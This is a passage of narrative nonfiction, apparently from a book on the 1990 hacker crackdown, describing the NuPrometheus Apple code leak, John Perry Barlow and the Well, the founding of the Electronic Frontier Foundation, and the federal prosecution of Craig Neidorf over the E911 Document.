plenty of money with which to push their calculated public image, but they waste much energy and goodwill attacking one another with slanderous and demeaning ad campaigns.  The telcos have suffered at the hands of politicians, and, like hackers, they don't trust the public's judgement.  And this distrust may be well founded.  Should the general public of the high tech 1990s come to understand its own best interests in telecommunications, that might well pose a grave threat to the specialized technical power and authority that the telcos have relished for over a century.  The telcos do have strong advantages  loyal employees, specialized expertise, influence in the halls of power, tactical allies in law enforcement, and unbelievably vast amounts of money.  But politically speaking, they lack genuine grassroots support  they simply don't seem to have many friends.    Cops know a lot of things other people don't know.  But cops willingly reveal only those aspects of their knowledge that they feel will meet their institutional purposes and further public order.  Cops have respect, they have responsibilities, they have power in the streets and even power in the home, but cops don't do particularly well in limelight.  When pressed, they will step out in the public gaze to threaten bad guys, or to cajole prominent citizens, or perhaps to sternly lecture the naive and misguided.  But then they go back within their time  honored fortress of the station house, the courtroom and the rule book.    The electronic civil libertarians, however, have proven to be born political animals.  They seemed to grasp very early on the postmodern truism that communication is power.  Publicity is power.  Soundbites are power.  The ability to shove one's issue onto the public agenda  and KEEP IT THERE  is power.  Fame is power.  Simple personal fluency and eloquence can be power, if you can somehow catch the public's eye and ear.    The civil libertarians had no monopoly on  technical power   though they all owned computers, most were not particularly advanced computer experts.  They had a good deal of money, but nowhere near the earthshaking wealth and the galaxy of resources possessed by telcos or federal agencies.  They had no ability to arrest people.  They carried out no phreak and hacker covert dirty tricks.    But they really knew how to network.    Unlike the other groups in this book, the civil libertarians have operated very much in the open, more or less right in the public hurly burly.  They have lectured audiences galore and talked to countless journalists, and have learned to refine their spiels.  They've kept the cameras clicking, kept those faxes humming, swapped that email, run those photocopiers on overtime, licked envelopes and spent small fortunes on airfare and long distance.  In an information society, this open, overt, obvious activity has proven to be a profound advantage.    In 1990, the civil libertarians of cyberspace assembled out of nowhere in particular, at warp speed.  This  group   actually, a networking gaggle of interested parties which scarcely deserves even that loose term  has almost nothing in the way of formal organization.  Those formal civil libertarian organizations which did take an interest in cyberspace issues, mainly the Computer Professionals for Social Responsibility and the American Civil Liberties Union, were carried along by events in 1990, and acted mostly as adjuncts, underwriters or launching  pads.    The civil libertarians nevertheless enjoyed the greatest success of any of the groups in the Crackdown of 1990.  At this writing, their future looks rosy and the political initiative is firmly in their hands.  This should be kept in mind as we study the highly unlikely lives and lifestyles of the people who actually made this happen.     In June 1989, Apple Computer, Inc., of Cupertino, California, had a problem.  Someone had illicitly copied a small piece of Apple's proprietary software, software which controlled an internal chip driving the Macintosh screen display.  This Color QuickDraw source code was a closely guarded piece of Apple's intellectual property.  Only trusted Apple insiders were supposed to possess it.    But the  NuPrometheus League  wanted things otherwise. This person  or persons  made several illicit copies of this source code, perhaps as many as two dozen.  He  or she, or they  then put those illicit floppy disks into envelopes and mailed them to people all over America   people in the computer industry who were associated with, but not directly employed by, Apple Computer.    The NuPrometheus caper was a complex, highly ideological, and very hacker like crime.  Prometheus, it will be recalled, stole the fire of the Gods and gave this potent gift to the general ranks of downtrodden mankind.  A similar god in the  manger attitude was implied for the corporate elite of Apple Computer, while the  Nu  Prometheus had himself cast in the role of rebel demigod.  The illicitly copied data was given away for free.    The new Prometheus, whoever he was, escaped the fate of the ancient Greek Prometheus, who was chained to a rock for centuries by the vengeful gods while an eagle tore and ate his liver.  On the other hand, NuPrometheus chickened out somewhat by comparison with his role model.  The small chunk of Color QuickDraw code he had filched and replicated was more or less useless to Apple's industrial rivals  or, in fact, to anyone else .  Instead of giving fire to mankind, it was more as if NuPrometheus had photocopied the schematics for part of a Bic lighter.  The act was not a genuine work of industrial espionage. It was best interpreted as a symbolic, deliberate slap in the face for the Apple corporate hierarchy.    Apple's internal struggles were well known in the industry.  Apple's founders, Jobs and Wozniak, had both taken their leave long since.  Their raucous core of senior employees had been a barnstorming crew of 1960s Californians, many of them markedly less than happy with the new button down multimillion dollar regime at Apple.  Many of the programmers and developers who had invented the Macintosh model in the early 1980s had also taken their leave of the company.  It was they, not the current masters of Apple's corporate fate, who had invented the stolen Color QuickDraw code.  The NuPrometheus stunt was well calculated to wound company morale.    Apple called the FBI.  The Bureau takes an interest in high profile intellectual property theft cases, industrial espionage and theft of trade secrets.  These were likely the right people to call, and rumor has it that the entities responsible were in fact discovered by the FBI, and then quietly squelched by Apple management.  NuPrometheus was never publicly charged with a crime, or prosecuted, or jailed.  But there were no further illicit releases of Macintosh internal software. Eventually the painful issue of NuPrometheus was allowed to fade.    In the meantime, however, a large number of puzzled bystanders found themselves entertaining surprise guests from the FBI.    One of these people was John Perry Barlow.  Barlow is a most unusual man, difficult to describe in conventional terms. He is perhaps best known as a songwriter for the Grateful Dead, for he composed lyrics for  Hell in a Bucket,   Picasso Moon,   Mexicali Blues,   I Need a Miracle,  and many more  he has been writing for the band since 1970.    Before we tackle the vexing question as to why a rock lyricist should be interviewed by the FBI in a computer crime case, it might be well to say a word or two about the Grateful Dead.  The Grateful Dead are perhaps the most successful and long lasting of the numerous cultural emanations from the Haight  Ashbury district of San Francisco, in the glory days of Movement politics and lysergic transcendance.  The Grateful Dead are a nexus, a veritable whirlwind, of applique decals, psychedelic vans, tie dyed T shirts, earth color denim, frenzied dancing and open and unashamed drug use.  The symbols, and the realities, of Californian freak power surround the Grateful Dead like knotted macrame.    The Grateful Dead and their thousands of Deadhead devotees are radical Bohemians.  This much is widely understood. Exactly what this implies in the 1990s is rather more problematic.    The Grateful Dead are among the world's most popular and wealthy entertainers  number 20, according to FORBES magazine, right between M.C. Hammer and Sean Connery.  In 1990, this jeans  clad group of purported raffish outcasts earned seventeen million dollars.  They have been earning sums much along this line for quite some time now.    And while the Dead are not investment bankers or three  piece suit tax specialists  they are, in point of fact, hippie musicians  this money has not been squandered in senseless Bohemian excess.  The Dead have been quietly active for many years, funding various worthy activities in their extensive and widespread cultural community.    The Grateful Dead are not conventional players in the American power establishment.  They nevertheless are something of a force to be reckoned with.  They have a lot of money and a lot of friends in many places, both likely and unlikely.    The Dead may be known for back to the earth environmentalist rhetoric, but this hardly makes them anti  technological Luddites.  On the contrary, like most rock musicians, the Grateful Dead have spent their entire adult lives in the company of complex electronic equipment.  They have funds to burn on any sophisticated tool and toy that might happen to catch their fancy.  And their fancy is quite extensive.    The Deadhead community boasts any number of recording engineers, lighting experts, rock video mavens, electronic technicians of all descriptions.  And the drift goes both ways. Steve Wozniak, Apple's co founder, used to throw rock festivals. Silicon Valley rocks out.    These are the 1990s, not the 1960s.  Today, for a surprising number of people all over America, the supposed dividing line between Bohemian and technician simply no longer exists.  People of this sort may have a set of windchimes and a dog with a knotted kerchief 'round its neck, but they're also quite likely to own a multimegabyte Macintosh running MIDI synthesizer software and trippy fractal simulations.  These days, even Timothy Leary himself, prophet of LSD, does virtual reality computer graphics demos in his lecture tours.    John Perry Barlow is not a member of the Grateful Dead. He is, however, a ranking Deadhead.    Barlow describes himself as a  techno crank.   A vague term like  social activist  might not be far from the mark, either.  But Barlow might be better described as a  poet   if one keeps in mind Percy Shelley's archaic definition of poets as  unacknowledged legislators of the world.     Barlow once made a stab at acknowledged legislator status.  In 1987, he narrowly missed the Republican nomination for a seat in the Wyoming State Senate.  Barlow is a Wyoming native, the third generation scion of a well to do cattle  ranching family.  He is in his early forties, married and the father of three daughters.    Barlow is not much troubled by other people's narrow notions of consistency.  In the late 1980s, this Republican rock lyricist cattle rancher sold his ranch and became a computer telecommunications devotee.    The free spirited Barlow made this transition with ease. He genuinely enjoyed computers.  With a beep of his modem, he leapt from small town Pinedale, Wyoming, into electronic contact with a large and lively crowd of bright, inventive, technological sophisticates from all over the world.  Barlow found the social milieu of computing attractive  its fast lane pace, its blue sky rhetoric, its open endedness.  Barlow began dabbling in computer journalism, with marked success, as he was a quick study, and both shrewd and eloquent.  He frequently travelled to San Francisco to network with Deadhead friends.  There Barlow made extensive contacts throughout the Californian computer community, including friendships among the wilder spirits at Apple.    In May 1990, Barlow received a visit from a local Wyoming agent of the FBI.  The NuPrometheus case had reached Wyoming.    Barlow was troubled to find himself under investigation in an area of his interests once quite free of federal attention. He had to struggle to explain the very nature of computer crime to a headscratching local FBI man who specialized in cattle  rustling.  Barlow, chatting helpfully and demonstrating the wonders of his modem to the puzzled fed, was alarmed to find all  hackers  generally under FBI suspicion as an evil influence in the electronic community.  The FBI, in pursuit of a hacker called  NuPrometheus,  were tracing attendees of a suspect group called the Hackers Conference.    The Hackers Conference, which had been started in 1984, was a yearly Californian meeting of digital pioneers and enthusiasts.  The hackers of the Hackers Conference had little if anything to do with the hackers of the digital underground.  On the contrary, the hackers of this conference were mostly well to  do Californian high tech CEOs, consultants, journalists and entrepreneurs.   This group of hackers were the exact sort of  hackers  most likely to react with militant fury at any criminal degradation of the term  hacker.      Barlow, though he was not arrested or accused of a crime, and though his computer had certainly not gone out the door, was very troubled by this anomaly.  He carried the word to the Well.     Like the Hackers Conference,  the Well  was an emanation of the Point Foundation.  Point Foundation, the inspiration of a wealthy Californian 60s radical named Stewart Brand, was to be a major launch pad of the civil libertarian effort.    Point Foundation's cultural efforts, like those of their fellow Bay Area Californians the Grateful Dead, were multifaceted and multitudinous.  Rigid ideological consistency had never been a strong suit of the WHOLE EARTH CATALOG.  This Point publication had enjoyed a strong vogue during the late 60s and early 70s, when it offered hundreds of practical  and not so practical  tips on communitarian living, environmentalism, and getting back to  the land.  The WHOLE EARTH CATALOG, and its sequels, sold two and half million copies and won a National Book Award.    With the slow collapse of American radical dissent, the WHOLE EARTH CATALOG had slipped to a more modest corner of the cultural radar  but in its magazine incarnation, COEVOLUTION QUARTERLY, the Point Foundation continued to offer a magpie potpourri of  access to tools and ideas.     COEVOLUTION QUARTERLY, which started in 1974, was never a widely popular magazine.  Despite periodic outbreaks of millenarian fervor, COEVOLUTION QUARTERLY failed to revolutionize Western civilization and replace leaden centuries of history with bright new Californian paradigms.  Instead, this propaganda arm of Point Foundation cakewalked a fine line between impressive brilliance and New Age flakiness.  COEVOLUTION QUARTERLY carried no advertising, cost a lot, and came out on cheap newsprint with modest black and white graphics.  It was poorly distributed, and spread mostly by subscription and word of mouth.    It could not seem to grow beyond 30,000 subscribers.  And yet  it never seemed to shrink much, either.  Year in, year out, decade in, decade out, some strange demographic minority accreted to support the magazine.  The enthusiastic readership did not seem to have much in the way of coherent politics or ideals.  It was sometimes hard to understand what held them together  if the often bitter debate in the letter columns could be described as  togetherness  .    But if the magazine did not flourish, it was resilient  it got by.  Then, in 1984, the birth year of the Macintosh computer, COEVOLUTION QUARTERLY suddenly hit the rapids.  Point Foundation had discovered the computer revolution.  Out came the WHOLE EARTH SOFTWARE CATALOG of 1984, arousing headscratching doubts among the tie dyed faithful, and rabid enthusiasm among the nascent  cyberpunk  milieu, present company included.  Point Foundation started its yearly Hackers Conference, and began to take an extensive interest in the strange new possibilities of digital counterculture.  COEVOLUTION QUARTERLY folded its teepee, replaced by WHOLE EARTH SOFTWARE REVIEW and eventually by WHOLE EARTH REVIEW  the magazine's present incarnation, currently under the editorship of virtual reality maven Howard Rheingold .    1985 saw the birth of the  WELL   the  Whole Earth 'Lectronic Link.   The Well was Point Foundation's bulletin board system.    As boards went, the Well was an anomaly from the beginning, and remained one.  It was local to San Francisco.  It was huge, with multiple phonelines and enormous files of commentary.  Its complex UNIX based software might be most charitably described as  user opaque.   It was run on a mainframe out of the rambling offices of a non profit cultural foundation in Sausalito.  And it was crammed with fans of the Grateful Dead.    Though the Well was peopled by chattering hipsters of the Bay Area counterculture, it was by no means a  digital underground  board.  Teenagers were fairly scarce  most Well users  known as  Wellbeings   were thirty  and forty something Baby Boomers.  They tended to work in the information industry  hardware, software, telecommunications, media, entertainment. Librarians, academics, and journalists were especially common on the Well, attracted by Point Foundation's open handed distribution of  tools and ideas.     There were no anarchy files on the Well, scarcely a dropped hint about access codes or credit card theft.  No one used handles.  Vicious  flame wars  were held to a comparatively civilized rumble.  Debates were sometimes sharp, but no Wellbeing ever claimed that a rival had disconnected his phone, trashed his house, or posted his credit card numbers.    The Well grew slowly as the 1980s advanced.  It charged a modest sum for access and storage, and lost money for years  but not enough to hamper the Point Foundation, which was nonprofit anyway.  By 1990, the Well had about five thousand users.  These users wandered about a gigantic cyberspace smorgasbord of  Conferences , each conference itself consisting of a welter of  topics,  each topic containing dozens, sometimes hundreds of comments, in a tumbling, multiperson debate that could last for months or years on end.    In 1991, the Well's list of conferences looked like this                          CONFERENCES ON THE WELL                 WELL  Screenzine  Digest    g zine            Best of the WELL   vintage

But this confusion is more apparent than real.  Each of these conferences was a little cyberspace world in itself, comprising dozens and perhaps hundreds of sub topics.  Each conference was commonly frequented by a fairly small, fairly like minded community of perhaps a few dozen people.  It was humanly impossible to encompass the entire Well  especially since access to the Well's mainframe computer was billed by the hour . Most long time users contented themselves with a few favorite topical neighborhoods, with the occasional foray elsewhere for a taste of exotica.  But especially important news items, and hot topical debates, could catch the attention of the entire Well community.    Like any community, the Well had its celebrities, and John Perry Barlow, the silver tongued and silver modemed lyricist of the Grateful Dead, ranked prominently among them.  It was here on the Well that Barlow posted his true life tale of computer  crime encounter with the FBI.    The story, as might be expected, created a great stir. The Well was already primed for hacker controversy.  In December 1989, HARPER'S magazine had hosted a debate on the Well about the ethics of illicit computer intrusion.  While over forty various computer mavens took part, Barlow proved a star in the debate. So did  Acid Phreak  and  Phiber Optik,  a pair of young New York hacker phreaks whose skills at telco switching station intrusion were matched only by their apparently limitless hunger for fame. The advent of these two boldly swaggering outlaws in the precincts of the Well created a sensation akin to that of Black Panthers at a cocktail party for the radically chic.    Phiber Optik in particular was to seize the day in 1990. A devotee of the _2600_ circle and stalwart of the New York hackers' group  Masters of Deception,  Phiber Optik was a splendid exemplar of the computer intruder as committed dissident.  The eighteen year old Optik, a high school dropout and part time computer repairman, was young, smart, and ruthlessly obsessive, a sharp dressing, sharp talking digital dude who was utterly and airily contemptuous of anyone's rules but his own.  By late 1991, Phiber Optik had appeared in HARPER'S, ESQUIRE, THE NEW YORK TIMES, in countless public debates and conventions, even on a television show hosted by Geraldo Rivera.    Treated with gingerly respect by Barlow and other Well mavens, Phiber Optik swiftly became a Well celebrity.  Strangely, despite his thorny attitude and utter single mindedness, Phiber Optik seemed to arouse strong protective instincts in most of the people who met him.  He was great copy for journalists, always fearlessly ready to swagger, and, better yet, to actually DEMONSTRATE some off the wall digital stunt.  He was a born media darling.    Even cops seemed to recognize that there was something peculiarly unworldly and uncriminal about this particular troublemaker.  He was so bold, so flagrant, so young, and so obviously doomed, that even those who strongly disapproved of his actions grew anxious for his welfare, and began to flutter about him as if he were an endangered seal pup.    In January 24, 1990  nine days after the Martin Luther King Day Crash , Phiber Optik, Acid Phreak, and a third NYC scofflaw named Scorpion were raided by the Secret Service.  Their computers went out the door, along with the usual blizzard of papers, notebooks, compact disks, answering machines, Sony Walkmans, etc.  Both Acid Phreak and Phiber Optik were accused of having caused the Crash.    The mills of justice ground slowly.  The case eventually fell into the hands of the New York State Police.  Phiber had lost his machinery in the raid, but there were no charges filed against him for over a year.  His predicament was extensively publicized on the Well, where it caused much resentment for police tactics.  It's one thing to merely hear about a hacker raided or busted  it's another to see the police attacking someone you've come to know personally, and who has explained his motives at length.  Through the HARPER'S debate on the Well, it had become clear to the Wellbeings that Phiber Optik was not in fact going to  hurt anything.   In their own salad days, many Wellbeings had tasted tear gas in pitched street battles with police.  They were inclined to indulgence for acts of civil disobedience.    Wellbeings were also startled to learn of the draconian thoroughness of a typical hacker search and seizure.  It took no great stretch of imagination for them to envision themselves suffering much the same treatment.    As early as January 1990, sentiment on the Well had already begun to sour, and people had begun to grumble that  hackers  were getting a raw deal from the ham handed powers  that be.  The resultant issue of HARPER'S magazine posed the question as to whether computer intrusion was a  crime  at all. As Barlow put it later    I've begun to wonder if we wouldn't also regard spelunkers as desperate criminals if AT T owned all the caves.     In February 1991, more than a year after the raid on his home, Phiber Optik was finally arrested, and was charged with first degree Computer Tampering and Computer Trespass, New York state offenses.  He was also charged with a theft of service misdemeanor, involving a complex free call scam to a 900 number. Phiber Optik pled guilty to the misdemeanor charge, and was sentenced to 35 hours of community service.    This passing harassment from the unfathomable world of straight people seemed to bother Optik himself little if at all. Deprived of his computer by the January search and seizure, he simply bought himself a portable computer so the cops could no longer monitor the phone where he lived with his Mom, and he went right on with his depredations, sometimes on live radio or in front of television cameras.    The crackdown raid may have done little to dissuade Phiber Optik, but its galling affect on the Wellbeings was profound.  As 1990 rolled on, the slings and arrows mounted   the Knight Lightning raid, the Steve Jackson raid, the nation  spanning Operation Sundevil.  The rhetoric of law enforcement made it clear that there was, in fact, a concerted crackdown on hackers in progress.    The hackers of the Hackers Conference, the Wellbeings, and their ilk, did not really mind the occasional public misapprehension of  hacking   if anything, this membrane of differentiation from straight society made the  computer community  feel different, smarter, better.  They had never before been confronted, however, by a concerted vilification campaign.    Barlow's central role in the counter struggle was one of the major anomalies of 1990.  Journalists investigating the controversy often stumbled over the truth about Barlow, but they commonly dusted themselves off and hurried on as if nothing had happened.  It was as if it were TWO MUCH TO BELIEVE that a 1960s freak from the Grateful Dead had taken on a federal law enforcement operation head to head and ACTUALLY SEEMED TO BE WINNING!    Barlow had no easily detectable power base for a political struggle of this kind.  He had no formal legal or technical credentials.  Barlow was, however, a computer networker of truly stellar brilliance.  He had a poet's gift of concise, colorful phrasing.  He also had a journalist's shrewdness, an off the wall, self deprecating wit, and a phenomenal wealth of simple personal charm.    The kind of influence Barlow possessed is fairly common currency in literary, artistic, or musical circles.  A gifted critic can wield great artistic influence simply through defining the temper of the times, by coining the catch phrases and the terms of debate that become the common currency of the period.  And as it happened, Barlow WAS a part time art critic, with a special fondness for the Western art of Frederic Remington.     Barlow was the first commentator to adopt William Gibson's striking science fictional term  cyberspace  as a synonym for the present day nexus of computer and telecommunications networks.  Barlow was insistent that cyberspace should be regarded as a qualitatively new world, a  frontier.   According to Barlow, the world of electronic communications, now made visible through the computer screen, could no longer be usefully regarded as just a tangle of high  tech wiring.  Instead, it had become a PLACE, cyberspace, which demanded a new set of metaphors, a new set of rules and behaviors.  The term, as Barlow employed it, struck a useful chord, and this concept of cyberspace was picked up by TIME, SCIENTIFIC AMERICAN, computer police, hackers, and even Constitutional scholars.   Cyberspace  now seems likely to become a permanent fixture of the language.    Barlow was very striking in person  a tall, craggy faced, bearded, deep voiced Wyomingan in a dashing Western ensemble of jeans, jacket, cowboy boots, a knotted throat kerchief and an ever present Grateful Dead cloisonne lapel pin.    Armed with a modem, however, Barlow was truly in his element.  Formal hierarchies were not Barlow's strong suit  he rarely missed a chance to belittle the  large organizations and their drones,  with their uptight, institutional mindset.  Barlow was very much of the free spirit persuasion, deeply unimpressed by brass hats and jacks in office.  But when it came to the digital grapevine, Barlow was a cyberspace ad hocrat par excellence.    There was not a mighty army of Barlows.  There was only one Barlow, and he was a fairly anomolous individual.  However, the situation only seemed to REQUIRE a single Barlow.  In fact, after 1990, many people must have concluded that a single Barlow was far more than they'd ever bargained for.    Barlow's querulous mini essay about his encounter with the FBI struck a strong chord on the Well.  A number of other free spirits on the fringes of Apple Computing had come under suspicion, and they liked it not one whit better than he did.    One of these was Mitchell Kapor, the co inventor of the spreadsheet program  Lotus 1 2 3  and the founder of Lotus Development Corporation.  Kapor had written off the passing indignity of being fingerprinted down at his own local Boston FBI headquarters, but Barlow's post made the full national scope of the FBI's dragnet clear to Kapor.  The issue now had Kapor's full attention.  As the Secret Service swung into anti hacker operation nationwide in 1990, Kapor watched every move with deep skepticism and growing alarm.    As it happened, Kapor had already met Barlow, who had interviewed Kapor for a California computer journal.  Like most people who met Barlow, Kapor had been very taken with him.  Now Kapor took it upon himself to drop in on Barlow for a heart to  heart talk about the situation.    Kapor was a regular on the Well.  Kapor had been a devotee of the WHOLE EARTH CATALOG since the beginning, and treasured a complete run of the magazine.  And Kapor not only had a modem, but a private jet.  In pursuit of the scattered high  tech investments of Kapor Enterprises Inc., his personal, multi  million dollar holding company, Kapor commonly crossed state lines with about as much thought as one might give to faxing a letter.    The Kapor Barlow council of June 1990, in Pinedale, Wyoming, was the start of the Electronic Frontier Foundation. Barlow swiftly wrote a manifesto,  Crime and Puzzlement,  which announced his, and Kapor's, intention to form a political organization to  raise and disburse funds for education, lobbying, and litigation in the areas relating to digital speech and the extension of the Constitution into Cyberspace.     Furthermore, proclaimed the manifesto, the foundation would  fund, conduct, and support legal efforts to demonstrate that the Secret Service has exercised prior restraint on publications, limited free speech, conducted improper seizure of equipment and data, used undue force, and generally conducted itself in a fashion which is arbitrary, oppressive, and unconstitutional.      Crime and Puzzlement  was distributed far and wide through computer networking channels, and also printed in the WHOLE EARTH REVIEW.  The sudden declaration of a coherent, politicized counter strike from the ranks of hackerdom electrified the community.  Steve Wozniak  perhaps a bit stung by the NuPrometheus scandal  swiftly offered to match any funds Kapor offered the Foundation.    John Gilmore, one of the pioneers of Sun Microsystems, immediately offered his own extensive financial and personal support.  Gilmore, an ardent libertarian, was to prove an eloquent advocate of electronic privacy issues, especially freedom from governmental and corporate computer assisted surveillance of private citizens.    A second meeting in San Francisco rounded up further allies   Stewart Brand of the Point Foundation, virtual reality pioneers Jaron Lanier and Chuck Blanchard, network entrepreneur and venture capitalist Nat Goldhaber.  At this dinner meeting, the activists settled on a formal title  the Electronic Frontier Foundation, Incorporated.  Kapor became its president.  A new EFF Conference was opened on the Point Foundation's Well, and the Well was declared  the home of the Electronic Frontier Foundation.     Press coverage was immediate and intense.  Like their nineteenth century spiritual ancestors, Alexander Graham Bell and Thomas Watson, the high tech computer entrepreneurs of the 1970s and 1980s  people such as Wozniak, Jobs, Kapor, Gates, and H. Ross Perot, who had raised themselves by their bootstraps to dominate a glittering new industry  had always made very good copy.    But while the Wellbeings rejoiced, the press in general seemed nonplussed by the self declared  civilizers of cyberspace.   EFF's insistence that the war against  hackers  involved grave Constitutional civil liberties issues seemed somewhat farfetched, especially since none of EFF's organizers were lawyers or established politicians.  The business press in particular found it easier to seize on the apparent core of the story  that high tech entrepreneur Mitchell Kapor had established a  defense fund for hackers.   Was EFF a genuinely important political development  or merely a clique of wealthy eccentrics, dabbling in matters better left to the proper authorities   The jury was still out.    But the stage was now set for open confrontation.  And the first and the most critical battle was the hacker show trial of  Knight Lightning.        It has been my practice throughout this book to refer to hackers only by their  handles.   There is little to gain by giving the real names of these people, many of whom are juveniles, many of whom have never been convicted of any crime, and many of whom had unsuspecting parents who have already suffered enough.    But the trial of Knight Lightning on July 24 27, 1990, made this particular  hacker  a nationally known public figure. It can do no particular harm to himself or his family if I repeat the long established fact that his name is Craig Neidorf  pronounced NYE dorf .    Neidorf's jury trial took place in the United States District Court, Northern District of Illinois, Eastern Division, with the Honorable Nicholas J. Bua presiding.  The United States of America was the plaintiff, the defendant Mr. Neidorf.  The defendant's attorney was Sheldon T. Zenner of the Chicago firm of Katten, Muchin and Zavis.    The prosecution was led by the stalwarts of the Chicago Computer Fraud and Abuse Task Force  William J. Cook, Colleen D. Coughlin, and David A. Glockner, all Assistant United States Attorneys.  The Secret Service Case Agent was Timothy M. Foley.    It will be recalled that Neidorf was the co editor of an underground hacker  magazine  called PHRACK.  PHRACK was an entirely electronic publication, distributed through bulletin boards and over electronic networks.  It was amateur publication given away for free.  Neidorf had never made any money for his work in PHRACK.  Neither had his unindicted co editor  Taran King  or any of the numerous PHRACK contributors.    The Chicago Computer Fraud and Abuse Task Force, however, had decided to prosecute Neidorf as a fraudster.  To formally admit that PHRACK was a  magazine  and Neidorf a  publisher  was to open a prosecutorial Pandora's Box of First Amendment issues. To do this was to play into the hands of Zenner and his EFF advisers, which now included a phalanx of prominent New York civil rights lawyers as well as the formidable legal staff of Katten, Muchin and Zavis.  Instead, the prosecution relied heavily on the issue of access device fraud   Section 1029 of Title 18, the section from which the Secret Service drew its most direct jurisdiction over computer crime.    Neidorf's alleged crimes centered around the E911 Document.  He was accused of having entered into a fraudulent scheme with the Prophet, who, it will be recalled, was the Atlanta LoD member who had illicitly copied the E911 Document from the BellSouth AIMSX system.    The Prophet himself was also a co defendant in the Neidorf case, part and parcel of the alleged  fraud scheme  to  steal  BellSouth's E911 Document  and to pass the Document across state lines, which helped establish the Neidorf trial as a federal case .  The Prophet, in the spirit of full co operation, had agreed to testify against Neidorf.    In fact, all three of the Atlanta crew stood ready to testify against Neidorf.  Their own federal prosecutors in Atlanta had charged the Atlanta Three with    a  conspiracy,  b  computer fraud,  c  wire fraud,  d  access device fraud, and  e  interstate transportation of stolen property  Title 18, Sections 371, 1030, 1343, 1029, and 2314 .    Faced with this blizzard of trouble, Prophet and Leftist had ducked any public trial and had pled guilty to reduced charges  one conspiracy count apiece.  Urvile had pled guilty to that odd bit of Section 1029 which makes it illegal to possess  fifteen or more  illegal access devices  in his case, computer passwords .  And their sentences were scheduled for September 14, 1990  well after the Neidorf trial.  As witnesses, they could presumably be relied upon to behave.    Neidorf, however, was pleading innocent.  Most everyone else caught up in the crackdown had  cooperated fully  and pled guilty in hope of reduced sentences.   Steve Jackson was a notable exception, of course, and had strongly protested his innocence from the very beginning.  But Steve Jackson could not get a day in court  Steve Jackson had never been charged with any crime in the first place.     Neidorf had been urged to plead guilty.  But Neidorf was a political science major and was disinclined to go to jail for  fraud  when he had not made any money, had not broken into any computer, and had been publishing a magazine that he considered protected under the First Amendment.    Neidorf's trial was the ONLY legal action of the entire Crackdown that actually involved bringing the issues at hand out for a public test in front of a jury of American citizens.    Neidorf, too, had cooperated with investigators.  He had voluntarily handed over much of the evidence that had led to his own indictment.  He had already admitted in writing that he knew that the E911 Document had been stolen before he had  published  it in PHRACK  or, from the prosecution's point of view, illegally transported stolen property by wire in something purporting to be a  publication.     But even if the  publication  of the E911 Document was not held to be a crime, that wouldn't let Neidorf off the hook. Neidorf had still received the E911 Document when Prophet had transferred it to him from Rich Andrews' Jolnet node.  On that occasion, it certainly hadn't been  published   it was hacker booty, pure and simple, transported across state lines.    The Chicago Task Force led a Chicago grand jury to indict Neidorf on a set of charges that could have put him in jail for thirty years.  When some of these charges were successfully challenged before Neidorf actually went to trial, the Chicago Task Force rearranged his indictment so that he faced a possible jail term of over sixty years!  As a first offender, it was very unlikely that Neidorf would in fact receive a sentence so drastic  but the Chicago Task Force clearly intended to see Neidorf put in prison, and his conspiratorial  magazine  put permanently out of commission.  This was a federal case, and Neidorf was charged with the fraudulent theft of property worth almost eighty thousand dollars.    William Cook was a strong believer in high profile prosecutions with symbolic overtones.  He often published articles on his work in the security trade press, arguing that  a clear message had to be sent to the public at large and the computer community in particular that unauthorized attacks on computers and the theft of computerized information would not be tolerated by the courts.     The issues were complex, the prosecution's tactics somewhat unorthodox, but the Chicago Task Force had proved sure  footed to date.   Shadowhawk  had been bagged on the wing in 1989 by the Task Force, and sentenced to nine months in prison, and a  10,000 fine.  The Shadowhawk case involved charges under Section 1030, the  federal interest computer  section.    Shadowhawk had not in fact been a devotee of  federal  interest  computers per se.  On the contrary, Shadowhawk, who owned an AT T home computer, seemed to cherish a special aggression toward AT T.  He had bragged on the underground boards  Phreak Klass 2600  and  Dr. Ripco  of his skills at raiding AT T, and of his intention to crash AT T's national phone system. Shadowhawk's brags were noticed by Henry Kluepfel of Bellcore Security, scourge of the outlaw boards, whose relations with the Chicago Task Force were long and intimate.    The Task Force successfully established that Section 1030 applied to the teenage Shadowhawk, despite the objections of his defense attorney.  Shadowhawk had entered a computer  owned  by U.S. Missile Command and merely  managed  by AT T.  He had also entered an AT T computer located at Robbins Air Force Base in Georgia.  Attacking AT T was of  federal interest  whether Shadowhawk had intended it or not.    The Task Force also convinced the court that a piece of AT T software that Shadowhawk had illicitly copied from Bell Labs, the  Artificial Intelligence C5 Expert System,  was worth a cool one million dollars.  Shadowhawk's attorney had argued that Shadowhawk had not sold the program and had made no profit from the illicit copying.  And in point of fact, the C5 Expert System was experimental software, and had no established market value because it had never been on the market in the first place. AT T's own assessment of a  one million dollar  figure for its own intangible property was accepted without challenge by the court, however.  And the court concurred with the government prosecutors that Shadowhawk showed clear  intent to defraud  whether he'd gotten any money or not.  Shadowhawk went to jail.    The Task Force's other best known triumph had been the conviction and jailing of  Kyrie.   Kyrie, a true denizen of the digital criminal underground, was a 36 year old Canadian woman, convicted and jailed for telecommunications fraud in Canada. After her release from prison, she had fled the wrath of Canada Bell and the Royal Canadian Mounted Police, and eventually settled, very unwisely, in Chicago.     Kyrie,  who also called herself  Long Distance Information,  specialized in voice mail abuse.  She assembled large numbers of hot long distance codes, then read them aloud into a series of corporate voice mail systems.  Kyrie and her friends were electronic squatters in corporate voice mail systems, using them much as if they were pirate bulletin boards, then moving on when their vocal chatter clogged the system and the owners necessarily wised up.  Kyrie's camp followers were a loose tribe of some hundred and fifty phone phreaks, who followed her trail of piracy from machine to machine, ardently begging for her services and expertise.    Kyrie's disciples passed her stolen credit card numbers, in exchange for her stolen  long distance information.   Some of Kyrie's clients paid her off in cash, by scamming credit card cash advances from Western Union.    Kyrie travelled incessantly, mostly through airline tickets and hotel rooms that she scammed through stolen credit cards.  Tiring of this, she found refuge with a fellow female phone phreak in Chicago.  Kyrie's hostess, like a surprising number of phone phreaks, was blind.  She was also physically disabled.  Kyrie allegedly made the best of her new situation by applying for, and receiving, state welfare funds under a false identity as a qualified caretaker for the handicapped.    Sadly, Kyrie's two children by a former marriage had also vanished underground with her  these pre teen digital refugees had no legal American identity, and had never spent a day in school.    Kyrie was addicted to technical mastery and enthralled by her own cleverness and the ardent worship of her teenage followers.  This foolishly led her to phone up Gail Thackeray in Arizona, to boast, brag, strut, and offer to play informant. Thackeray, however, had already learned far more than enough about Kyrie, whom she roundly despised as an adult criminal corrupting minors, a  female Fagin.   Thackeray passed her tapes of Kyrie's boasts to the Secret Service.    Kyrie was raided and arrested in Chicago in May 1989. She confessed at great length and pled guilty.    In August 1990, Cook and his Task Force colleague Colleen Coughlin 